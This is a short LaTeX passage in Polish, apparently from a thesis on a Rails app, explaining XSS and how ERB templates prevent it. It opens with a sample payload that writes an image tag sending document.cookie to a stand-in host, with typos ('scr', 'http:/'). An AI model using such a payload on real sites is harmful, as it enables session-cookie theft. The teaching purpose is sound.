\emph{Przykładowy atak typu XSS:}

\begin{code}
  \begin{lstlisting}[language=HTML, showstringspaces=false]
  <script>
    document.write(
      '<img scr="http:/hacked.site.com/' + document.cookie + '">'
    );
  </script>
  \end{lstlisting}
\end{code}\\

Dzięki wbudowanemu w Railsy systemowi \emph{ERB templates}\footnote{System za pomocą, którego kod strony html jest generowany dynamicznie.} mamy doczynienia z dynamicznym tworzeniem kodu HTML, co uniemożliwia większość ataków tego typu. Wszelkiego rodzaju odnośniki i dane na stronie zapisywane są przy użyciu specjalnej notacji:

\begin{code}
  \lstinputlisting[language=HTML, linerange={65-66}]{../meetspace/app/views/events/_form.html.erb}
\end{code}\\

która następnie zostaje przekompilowana do kodu HTML przez serwer i wysłana przeglądarce internetowej.

\begin{code}
  \begin{lstlisting}[language=HTML, showstringspaces=false]
    <a href="/events">My events</a>
    <a href="/">Events</a>
  \end{lstlisting}
\end{code}\\

